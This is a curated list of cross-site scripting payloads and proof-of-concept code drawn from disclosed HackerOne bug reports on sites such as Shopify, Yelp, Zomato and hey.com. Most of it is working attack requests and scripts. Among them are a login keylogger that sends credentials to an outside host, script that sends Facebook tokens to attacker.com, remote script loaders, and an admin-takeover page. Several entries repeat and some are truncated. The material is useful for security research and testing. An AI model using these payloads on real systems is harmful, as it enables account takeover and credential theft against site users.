# Cross-Site Scripting (XSS)  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#2078490](https://hackerone.com/reports/2078490)  -  Stored xss at https://█.8x8.com/api/█/ID
*high, $1,337*

```http
POST /api/patchPaymentMethod/█████████ HTTP/2
Host: ███.8x8.com
Cookie: ajs_anonymous_id=13b1ab4c-87f5-4dbb-967b-066b6d7efd1e; _gcl_au=1.1.275521026.1689699475; _fb…
Content-Type: application/json
Content-Length: 112

{
              "ipAddress": "<svg on onload=(alert)(document.domain)>",
"callBackURL":"dssdsd"
            }
```

## 2. [#314126](https://hackerone.com/reports/314126)  -  Blind XSS - Report review - Admin panel
*medium, $350*

```http
POST /v2/█████merchant HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 485
Host: api.zomato.com

reason_id=5&review_id=32288944&additional_text=<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

## 3. [#1069528](https://hackerone.com/reports/1069528)  -  Reflected XSS on gamesclub.mtn.com.g
*medium*

```http
GET /header.aspx HTTP/1.1
Host: gamesclub.mtn.com.gh
Cookie: _ga=GA1.1.535977033.1609258177; _gid=GA1.3.1739427388.1609466879; ASP.NET_SessionId=31wrle55…
```

## 4. [#988272](https://hackerone.com/reports/988272)  -  stored XSS in hey.com message content
*medium*

```http
POST /messages HTTP/1.1
Host: app.hey.com
Referer: https://app.hey.com/entries/[]/forwards/new
X-CSRF-Token: []
Content-Type: multipart/form-data; boundary=---------------------------392581797716153644644274802600
Origin: https://app.hey.com
Content-Length: 1156

-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="acting_user_id"

{acting_user_id}
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="entry[addressed][directly][]"

[second-email]@hey.com
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="message[subject]"

Fwd: csdc
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="message[content]"

From: "f" <[]@hey.com>
To: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com
Message-ID: <3654584aa703ca2fd963856f8495669174ef673f@hey.com>
Subject: <img src=wczxzx onerror=alert(1)>
Mime-Version: 1.0

    </style>
    </div>
    <svg><![CDATA[><table background="]])><img src=xx:x onerror=alert(2)//"></svg>
    <li style=onesr: src= cxxc=></li>
# … truncated …
```

## 5. [#903869](https://hackerone.com/reports/903869)  -  [bugs.fuzzing-project.org] HTML Injection via 'custom_field_7[]' parameter in '/view_all_set.php'
*medium*

```http
POST /view_all_set.php?f=3 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Referer: https://bugs.fuzzing-project.org/
Cookie: MANTIS_secure_session=0;MANTIS_collapse_settings=|sidebar:1|filter:1;PHPSESSID=1495fp23866b0m12bi541et8c7
Content-Length: 1947
Host: bugs.fuzzing-project.org

category_id[]=0&custom_field_1[]=0&custom_field_2[]=0&custom_field_3[]=0&custom_field_4[]=0&custom_field_5[]=0&custom_field_6[]=0&custom_field_7[]=0'"()%26%25"'</td>--><div class="position-relative"><div class="signup-box visible widget-box no-border" id="login-box"><div class="widget-body"><div class="widget-main"><h4 class="header lighter bigger"><i class="ace-icon fa fa-sign-in"></i>Inicio de sesión</h4><div class="space-10"></div><form id="login-form" method="post" action="https://www.dragonjar.org"><fieldset><label for="username" class="block clearfix"><span class="block input-icon input-icon-right"><input id="username" name="username" type="text" placeholder="Nombre de usuario"   size="32" maxlength="191" value=""   class="form-control autofocus"><i class="ace-icon fa fa-user"></i></span></label><label for="password" class="block clearfix"><span class="block input-icon input-icon-right"><input id="password" name="password" type="password" placeholder="Contraseña" size="32" maxlength="1024" class="form-control autofocus"><i class="ace-icon fa fa-lock"></i></span></label><div class="space-10"></div><input type="submit" class="width-40 pull-right btn btn-success btn-inverse bigger-110" value="Iniciar sesión" /></fieldset></form></div><!--&dir[]=ASC&end_day=15&end_month=2&end_year=2020&filter=Use%20Filter&filter_by_date=0&filter_by_last_updated_date=0&handler_id[]=0&hide_status[]=-2&highlight_changed=6&last_updated_end_day=15&last_updated_end_month=2&last_updated_end_year=2020&last_updated_start_day=15&last_updated_start_month=2&last_updated_start_year=2020&match_type=0&monitor_user_id[]=0&note_user_id[]=0&os[]=0&os_build[]=0&per_page=50&platform[]=0&priority[]=0&profile_id[]=0&relationship_bug=0&relationship_type=-1&reporter_id[]=0&resolution[]=0&search=the&severity[]=0&sort[]=priority&start_day=15&start_month=2&start_year=2020&status[]=10&sticky=0&tag_select=0&tag_string=17&type=1&view_state=0&view_type=simple
# … truncated …
```

## 6. [#425048](https://hackerone.com/reports/425048)  -  Stored XSS on chaturbate.com (wish list)
*low, $100*

```http
POST /accounts/editbio/ HTTP/1.1
Host: chaturbate.com
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://chaturbate.com/p/gwen129347565/?tab=bio
Content-Length: 738
Cookie: __cfduid=d2934f3470865ee3896a47085641d896a1538487853; affkey="eJyrViopylayUlBKzU1KTVHSUVBKTE…

csrfmiddlewaretoken=tC7J5FySgWbyelHAfbjULIHHjcBSoaLt&next=%2Faccounts%2Fshowbio%2F&real_name=aaaa&birthday_month=2&birthday_day=3&birthday_year=1963&gender=f&interested_in=f&location=France&spoken_languages=English&body_type=&smoke_drink=&body_decorations=&about_me=&wish_list=bbbbbb<img src="http://poc.10degres.net/ooo.png" style="width:expression(open(alert(document.cookie)))">aaa
```

## 7. [#409986](https://hackerone.com/reports/409986)  -  Improper handling of Chunked data request in sapi_apache2.c leads to Reflected XSS
*medium, $500*

```http
POST /lol.php HTTP/1.1
Host: localhost
Content-Type: application/json
Transfer-Encoding: chunked
Content-Length: 25

<script>alert(1)</script>HTTP/1.1 400 Bad Request
```

## 8. [#2051085](https://hackerone.com/reports/2051085)  -  Stored XSS on promo.indrive.com
*medium, $284*

```http
POST /api/spreadsheet/promocodes HTTP/1.1
Host: id.indrive.com
Content-Type: application/json
Content-Length: 55
Origin: https://promo.indrive.com
Referer: https://promo.indrive.com/

{"id":"4","activationDate":"<script>alert(1)</script>"}
```

## 9. [#921635](https://hackerone.com/reports/921635)  -  DOM XSS on duckduckgo.com search
*medium*

```http
POST /settings.js HTTP/1.1
Host: duckduckgo.com
Content-Length: 211

{
"command":"write",
"objectKey":"bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324",
"obj":{
"kp":"\"><svg/onload=eval(`'`+URL)>"
}
}
```

## 10. [#1853061](https://hackerone.com/reports/1853061)  -  XSS via Vuln Rendertron Instance At `██████████.jetblue.com/render/*`
*medium*

```http
GET /render/https://berkaybasar.github.io/ HTTP/2
Host: ███.jetblue.com
Cookie: _ga=GA1.2.948863714.1675140227; _gid=GA1.2.104763714.1675140227
Referer: https://█████████.jetblue.com/
```

## 11. [#232174](https://hackerone.com/reports/232174)  -  XSS on $shop$.myshopify.com/admin/ and partners.shopify.com via whitelist bypass in SVG icon for sales channel applications
*high, $5,000*

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [
    <!ENTITY elem "">
]>
<svg onload="alert(document.domain);" height="16" width="16">
  &elem;
</svg>
```

## 12. [#249131](https://hackerone.com/reports/249131)  -  Ability to create own account UUID leads to stored XSS
*high, $1,500*

```http
POST /c/user HTTP/1.1
Host: app.upserve.com
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://app.upserve.com/settings/account
Content-Length: 134
Content-Type: text/plain;charset=UTF-8

uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
```

## 13. [#430029](https://hackerone.com/reports/430029)  -  Stored XSS in infogram.com via language
*high*

```http
PUT /api/users/me HTTP/1.1
Host: infogram.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 135
Cookie: **your cookies**

first_name=name&last_name=name&username=&confirm_password=password&language=></script><img src=x onerror=alert(document.domain)>;//
```

## 14. [#2089042](https://hackerone.com/reports/2089042)  -  yelp.com and biz.yelp.com ATO via XSS + Cookie Bridge
*medium*

```javascript
for (var i = 0; i < 16; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
window.opener.postMessage({redirect:"https://biz.yelp.com/cookie_bridge/store?dhl=da_DK"}, "*");
setTimeout(function() {alert("attacker can now sign in as victim by going to:" + window.opener.location.href)}, 5000);
```

## 15. [#1247833](https://hackerone.com/reports/1247833)  -  Reflected Cross Site Scripting Cisco ASA on  myvpn.mtncameroon.net CVE-2020-3580
*medium*

```http
POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
Host: myvpn.mtncameroon.net
Cookie: webvpnlogin=1; webvpnLang=en
Content-Length: 42

SAMLResponse="><svg/onload=alert('Renzi')>
```

## 16. [#642281](https://hackerone.com/reports/642281)  -  Stored XSS in https://app.mopub.com
*medium*

```http
POST /reports/custom/add_network_report/ HTTP/1.1
Host: app.mopub.com
Referer: https://app.mopub.com/reports/custom/
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------68352596720712
Content-Length: 838
Cookie: _gcl_au=1.1.1079813240.1562926835; _ga=GA1.2.333952053.1562926836; _gid=GA1.2.668572806.1562…

-----------------------------68352596720712
```

## 17. [#662083](https://hackerone.com/reports/662083)  -  Inject page in admin panel via Shopify.API.pushState
*low, $500*

```html
<script>
    function attack(){
        const ctx = window.open(location.origin+'/admin/themes', '_blank')
        const data = JSON.stringify({
            message: 'Shopify.API.pushState',
            data: {pathname: "/../pages/xss"}
        });

        let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                ctx.postMessage(data)
            }
        }, 500)
    }
    attack()
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## 18. [#646505](https://hackerone.com/reports/646505)  -  ██████ DOM XSS via Shopify.API.remoteRedirect
*low*

```html
<script>
	  function attack(){
	    let ctx=window.open('https://apple-business-chat-commerce.shopifycloud.com'),interval;
	    let payload=btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`);
	    interval=setInterval(()=>{
	        ctx && ctx.postMessage({
        		"message":"Shopify.API.remoteRedirect",
        		"data":{
        			"location":`javascript:eval(atob('${payload}'))`
        		}
	        },location.origin);
	    },500);
	    window.onmessage=(e)=>{
	    	e.data==="success"&&(
	    		console.log('attack success'),
	    		window.onmessage=null,
	    		clearInterval(interval)
	    	);
	    };
	  }
	  attack();
	</script>
	<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## 19. [#2078490](https://hackerone.com/reports/2078490)  -  Stored xss at https://█.8x8.com/api/█/ID
*high, $1,337*

```http
POST /api/patchPaymentMethod/█████████ HTTP/2
Host: ███.8x8.com
Cookie: ajs_anonymous_id=13b1ab4c-87f5-4dbb-967b-066b6d7efd1e; _gcl_au=1.1.275521026.1689699475; _fb…
```

## 20. [#2010530](https://hackerone.com/reports/2010530)  -  yelp.com XSS ATO (via login keylogger, link Google account)
*high*

```javascript
setTimeout(function () {
  a = document.getElementsByName('password')[0];
  b = document.getElementsByName('email')[0];
  function f() {
    fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
  }
  a.form.onclick=f;
  a.onchange=f;
  b.onchange=f;
  a.oninput=f;
  b.oninput=f;
}, 1000)
```

## 21. [#409986](https://hackerone.com/reports/409986)  -  Improper handling of Chunked data request in sapi_apache2.c leads to Reflected XSS
*medium, $500*

```
Prashanths-MacBook-Pro:~ prashanthvarma$ nc localhost 80
POST /lol.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Transfer-Encoding: chunked
Content-Length: 25

<script>alert(1)</script>HTTP/1.1 400 Bad Request
Date: Mon, 09 Jul 2018 06:08:22 GMT
Server: Apache/2.4.33 (Unix) PHP/7.1.17
Content-Length: 226
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
</body></html>
 <script>alert(1)</script>
```

## 22. [#1069528](https://hackerone.com/reports/1069528)  -  Reflected XSS on gamesclub.mtn.com.g
*medium*

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Server: Microsoft-IIS/8.5
X-AspNet-Version: 2.0.50727
X-Powered-By: ASP.NET
Date: Fri, 01 Jan 2021 04:00:58 GMT
Connection: close
Content-Length: 1833

<b>Date: </b>1/1/2021 4:00:58 AM</br></br><b>Session Id: </b>31wrle55qcm5sr45ix01xu45</br></br><b>Cache-Control</b>--:max-age=0</br></br><b>Connection</b>--:close</br></br><b>Accept</b>--:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</br></br><b>Accept-Encoding</b>--:gzip, deflate</br></br><b>Accept-Language</b>--:en-US,en;q=0.5</br></br><b>Cookie</b>--:_ga=GA1.1.535977033.1609258177; _gid=GA1.3.1739427388.1609466879; ASP.NET_SessionId=31wrle55qcm5sr45ix01xu45; _fbp=fb.2.1609472983351.929571150; __zlcmid=11wjhZBGzje4QJl; mp_41d22b7448ab7bf3fe46553a849e9750_mixpanel=%7B%22distinct_id%22%3A%20%22176bc10ae6a345-0b6ab9a3d75ed18-4c3f207e-1fa400-176bc10ae6b4c3%22%2C%22%24device_id%22%3A%20%22176bc10ae6a345-0b6ab9a3d75ed18-4c3f207e-1fa400-176bc10ae6b4c3%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; _ga_N94D6VRGVG=GS1.1.1609472987.1.1.1609473387.0</br></br><b>Host</b>--:gamesclub.mtn.com.gh</br></br><b>User-Agent</b>--:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</br></br><b>https</b>--://www.google.com/search?hl=en&q=testing'"()&%"><img src=x onerror=alert(document.domain)></br></br><b>Upgrade-Insecure-Requests</b>--:1</br></br>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>

</title></head>
<body>
    <form name="form1" method="post" action="header.aspx" id="form1">
<div>
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTE2MTY2ODcyMjlkZPAMEC+PM7rDHrcWuoHAcMYZTDHa" />
</div>

<div>

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="D38F0298" />
</div>
    <div>
    
    </div>
    </form>
</body>
</html>
# … truncated …
```

## 23. [#422043](https://hackerone.com/reports/422043)  -  H1514 DOMXSS on Embedded SDK via Shopify.API.setWindowLocation abusing cookie Stuffing
*high*

```http
GET https://canvasfoobar.myshopify.com/admin/oauth/authorize?client_id=d25e45407e508f96409c2dd796e9bd95&redirect_uri=https%3A%2F%2Fscript-editor.shopifycloud.com%2Fauth%2Fshopify%2Fcallback&response_type=code&scope=write_scripts%2Cread_products%2Cread_customers&state=a HTTP/1.1
Host: canvasfoobar.myshopify.com
Cookie: _master_udr=LEGIT; _master_udr=EVIL; _secure_admin_session_id=EVIL
```

## 24. [#921635](https://hackerone.com/reports/921635)  -  DOM XSS on duckduckgo.com search
*medium*

```http
POST /settings.js HTTP/1.1
Host: duckduckgo.com
Content-Length: 248

{
"command":"write",
"objectKey":"bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff",
"obj":{
"kp":"\"><img src=/ onerror=alert(1)>",
"kae":"\"><img src=/ onerror=alert(2)>"
}
}
```

## 25. [#515484](https://hackerone.com/reports/515484)  -  [Reflected XSS] In Request URL
*low*

```http
POST /updater/index.php/h"><script>alert(1);</script> HTTP/1.1
Host: vulns.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

updater-secret-input={OUR_SECRET}
```

## 26. [#384112](https://hackerone.com/reports/384112)  -  xss - reflected
*low*

```http
POST /store/checkout/ HTTP/1.1
Host: masterplan.wordpress.net
Referer: http://masterplan.wordpress.net/store/checkout/
Content-Type: application/x-www-form-urlencoded
Content-Length: 814
Cookie: PHPSESSID=a040c364fca0ec1d75201d8aaee61546; wordpress_test_cookie=WP+Cookie+check

billing%5baddress%5d=1%20Main%20Streetzbn0b%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3ek8ez0&shipping%5bzip%5d=36310&billing%5bcountry%5d=AR&shipping%5baddress2%5d=1+Main+Street&payment%5bcardNumber%5d=555-555-0199@example.com&shipping%5bfirstName%5d=Peter&billing%5blastName%5d=Winter&shipping%5bcountry%5d=AR&payment%5bcardExpirationYear%5d=2018&billing%5bcity%5d=Winterville&billing%5bz
```

## 27. [#2010530](https://hackerone.com/reports/2010530)  -  yelp.com XSS ATO (via login keylogger, link Google account)
*high*

```javascript
(function f() {
  a = new XMLHttpRequest();
  a.addEventListener('load', function () {
    rx = /"GoogleConnect": "([^"]*)/;
    id_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg";
    b = rx.exec(this.responseText);
    fetch("https://www.yelp.dk/google_connect/register", {"method": "POST", "body": new URLSearchParams({"id_token": id_token, "csrftok": b[1]})})
  });
  a.open('GET', 'https://www.yelp.dk/profile_sharing');
  a.send();
})();
# … truncated …
```

## 28. [#632017](https://hackerone.com/reports/632017)  -  Self-Stored XSS - Chained with login/logout CSRF
*medium, $300*

```html
<script>
// load fb js-sdk
(function(d, s, id){
      var js, fjs = d.getElementsByTagName(s)[0];
      if (d.getElementById(id)) {return;}
      js = d.createElement(s); js.id = id;
      js.src = "//connect.facebook.net/en_US/sdk.js";
      fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));

window.fbAsyncInit = function() {
      FB.init({
        appId      : '288523881080', // zomato fb app id
        xfbml      : true,
        version    : 'v3.1'
      });

//get auth response ( accessToken and signedRequest )
FB.login(function(){
	$.post('https://attacker.com/tokens.php',FB.getAuthResponse())}); // send token and signed_request to attacker
	document.location.href = 'https://www.zomato.com/logout'; // logout from victims's account
 }
</script>
```

## 29. [#2051085](https://hackerone.com/reports/2051085)  -  Stored XSS on promo.indrive.com
*medium, $284*

```http
POST /api/spreadsheet/promocodes HTTP/1.1
Host: id.indrive.com
Content-Type: application/json
Content-Length: 55
Origin: https://promo.indrive.com
Referer: https://promo.indrive.com/
```

## 30. [#2089042](https://hackerone.com/reports/2089042)  -  yelp.com and biz.yelp.com ATO via XSS + Cookie Bridge
*medium*

```javascript
for (var i = 0; i < 15; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
```

## 31. [#2089042](https://hackerone.com/reports/2089042)  -  yelp.com and biz.yelp.com ATO via XSS + Cookie Bridge
*medium*

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>yelp xss poc</title>
  <script>
    function openTarget() {
      t = document.location.hash.substring(1);
      window.target = window.open(t);
    }

    // register a postmessage listener
    window.addEventListener('message', function (e) {
      console.log(e);
      if (e.data && e.data.redirect) {
        location.href = e.data.redirect; // this is vulnerable to xss but idc
      }
    });

  </script>
</head>
<body>
  <h1>Yelp.com account takeover POC</h1>
  <button onclick="openTarget()">click here to start attack</button>
</body>
</html>
```

## 32. [#3594137](https://hackerone.com/reports/3594137)  -  Stored XSS in attachment-display exploitable through SameSite
*medium*

```shell
$ python3 poc.py
{'roundcube_sessid': '1798cbb4c1d7c7f9ca26069b52aac1aa', 'roundcube_sessauth': 'GfNmiyX5brPm4l814QUx62l5gsJKBXfU-1773063000'}
compose_id='183727919869aecb6499f76'
{"action":"upload","exec":"this.add2attachment_list(\"rcmfile11773063013009066400\",{\"html\":\"<a href=\\\"#load\\\" class=\\\"filename\\\" onclick=\\\"return rcmail.command('load-attachment','rcmfile11773063013009066400', this, event)\\\"><span class=\\\"attachment-name\\\">xss.html</span><span class=\\\"attachment-size\\\">(30 B)</span></a><a href=\\\"#delete\\\" onclick=\\\"return rcmail.command('remove-attachment','rcmfile11773063013009066400', this, event)\\\" title=\\\"Delete\\\" class=\\\"delete\\\" aria-label=\\\"Delete xss.html\\\"></a>\",\"name\":\"xss.html\",\"mimetype\":\"text/html\",\"classname\":\"text html\",\"complete\":true},\"u128763271\");\nthis.auto_save_start(false);\n"}
att_id='11773063013009066400'
----------------------------------------------------------------------------------------------------
document.cookie='roundcube_sessid=1798cbb4c1d7c7f9ca26069b52aac1aa; Path=/index.php/xss; Domain=.target.local'
document.cookie='roundcube_sessauth=GfNmiyX5brPm4l814QUx62l5gsJKBXfU-1773063000; Path=/index.php/xss; Domain=.target.local'
location.href = 'http://mail.target.local/index.php/xss?_task=mail&_action=display-attachment&_id=183727919869aecb6499f76&_file=rcmfile11773063013009066400';
# … truncated …
```

## 33. [#283821](https://hackerone.com/reports/283821)  -  XSS when Shared
*medium*

```html
<div class="infogram-embed" data-id="d08ad077-3490-4241-b9a9-057da53e2e7d" data-type="interactive" data-title="<script>alert(1);</script>"></div><script>!function(e,t,s,i){var n="InfogramEmbeds",o=e.getElementsByTagName("script"),d=o[0],r=/^http:/.test(e.location)?"http:":"https:";if(/^\/{2}/.test(i)&&(i=r+i),window[n]&&window[n].initialized)window[n].process&&window[n].process();else if(!e.getElementById(s)){var a=e.createElement("script");a.async=1,a.id=s,a.src=i,d.parentNode.insertBefore(a,d)}}(document,0,"infogram-async","https://e.infogram.com/js/dist/embed-loader-min.js");</script><div style="padding:8px 0;font-family:Arial!important;font-size:13px!important;line-height:15px!important;text-align:center;border-top:1px solid #dadada;margin:0 30px"><a href="https://infogram.com/d08ad077-3490-4241-b9a9-057da53e2e7d" style="color:#989898!important;text-decoration:none!important;" target="_blank"><script>alert(1);</script></a><br><a href="https://infogram.com" style="color:#989898!important;text-decoration:none!important;" target="_blank" rel="nofollow">Infogram</a></div>
```

## 34. [#868615](https://hackerone.com/reports/868615)  -  Inject page in admin panel via Shopify.API.pushState with protocol invalid
*low, $500*

```javascript
<script>
function attack(){
    const ctx = window.open(location.origin+'/admin/themes', '_blank')
    const data = JSON.stringify({
        message: 'Shopify.API.pushState',
        data: {pathname: "invalid:pages/xss"}
    });

    let interval;
    interval = setInterval(function(){
        if (window.attackSuccess) {
            clearInterval(interval)
        } else {
            ctx.postMessage(data)
        }
    }, 500)
}
attack()
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## 35. [#602767](https://hackerone.com/reports/602767)  -  DOM XSS via Shopify.API.Modal.initialize
*low, $500*

```html
<script>
    function attack(){
        const ctx = window.open(location.origin+'/admin/themes', '_blank')
        const json = {
            message: "Shopify.API.Modal.initialize",
            data: {
                src: ""
            }
        }

        let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                ctx.postMessage(JSON.stringify(json)) // data.src == ""
                json.data.src = "javascript:alert(document.cookie)"
                ctx.postMessage(JSON.stringify(json))
            }
        }, 500)
    }
    attack()
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## 36. [#576532](https://hackerone.com/reports/576532)  -  DOM XSS via Shopify.API.remoteRedirect
*low*

```html
<script>
  function attack(){
  	var ctx=window.open('https://cuxuri.myshopify.com/admin/themes');
    var interval;
    interval=setInterval(function(){
      if(window.attackSuccess){
        clearInterval(interval);
      }else{
        ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);
      }
    },500);;
  }
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## 37. [#988272](https://hackerone.com/reports/988272)  -  stored XSS in hey.com message content
*medium*

```http
POST /messages HTTP/1.1
Host: app.hey.com
Referer: https://app.hey.com/entries/[]/forwards/new
X-CSRF-Token: []
Content-Type: multipart/form-data; boundary=---------------------------392581797716153644644274802600
Origin: https://app.hey.com
Content-Length: 1156
```

## 38. [#3115705](https://hackerone.com/reports/3115705)  -  Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover
*high*

```html
<html>
<head>
  <title>PoC - Dust Workspace Takeover</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 40px;
      background-color: #f8f9fa;
    }
    .container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
    }
    h1 {
      color: #333;
    }
    p {
      color: #555;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>Proof of Concept - Dust Workspace Admin Takeover</h1>
    <p>When this page is visited by an admin inside a workspace, he'll give the attacker's user ID admin privileges. The attacker can then manually de-rank the former admin to a regualar member.</p>
  </div>

<script>
// Your user ID here (dummy account's ID)
const attackerUserId = '<dummy_id>'; // <-- replace with dummy account ID!

fetch('https://dust.tt/api/user', {
    method: 'GET',
    headers: {
        'accept': '*/*',
        'x-commit-hash': '41c0391',
    },
# … truncated …
```

## 39. [#487081](https://hackerone.com/reports/487081)  -  Stored XSS in Private Message component (BuddyPress)
*critical*

```html
<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
```

## 40. [#487081](https://hackerone.com/reports/487081)  -  Stored XSS in Private Message component (BuddyPress)
*critical*

```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,97,109,101,32,61,32,112,97,114,101,110,116,46,66,80,95,78,111,117,118,101,97,117,46,109,101,115,115,97,103,101,115,46,114,111,111,116,85,114,108,46,115,112,108,105,116,40,39,47,39,41,91,50,93,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,109,101,109,98,101,114,115,47,39,32,43,32,110,97,109,101,32,43,32,39,47,112,114,111,102,105,108,101,47,101,100,105,116,47,103,114,111,117,112,47,49,47,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,102,105,101,108,